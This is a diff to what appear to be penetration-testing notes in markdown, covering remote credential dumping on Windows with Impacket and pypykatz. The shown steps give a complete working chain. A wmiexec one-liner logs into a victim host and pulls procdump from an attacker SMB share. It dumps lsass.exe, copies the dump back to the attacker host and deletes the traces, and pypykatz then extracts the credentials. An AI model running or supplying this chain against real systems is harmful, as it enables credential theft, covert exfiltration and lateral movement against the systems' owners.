@@ -72,13 +72,19 @@ pypykatz live lsa
 Instead of running wmiexec with multiple commands to upload procdump, dump lsass.exe, download the dump file, and copy that over to a Windows host to use Mimikatz: 
 
 Install pypykatz:
+
 `pip3 install pypykatz`
 
 Run Impacket smbserver.py:
+
 `./smbserver.py -smb2support <share name> <share path with procdump64.exe>`
 
 Run Impacket wmiexec.py:
+
 `./wmiexec.py <domain>/<username>:<password>@<Victim IP> 'copy \\<Attacker IP>\<share>\procdump64.exe . & procdump64.exe -accepteula -64 -ma lsass.exe lsass.dmp & copy lsass.dmp \\<Attacker IP>\<share>\ & del lsass.dmp & del procdump64.exe'`
 
 Dump creds from lsass.dmp:
+
 `pypykatz minidump lsass.dmp`
+
+Note: I've seen pypykatz error out on some editions of Windows 10. If this happens, you'll have to copy that lsass.dmp over to a Windows system under your control and use Mimikatz.
